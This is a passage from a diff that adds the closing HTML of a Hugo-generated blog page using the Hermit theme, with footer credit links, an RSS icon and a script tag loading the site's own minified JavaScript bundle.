+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://theoyu.top/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://theoyu.top/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
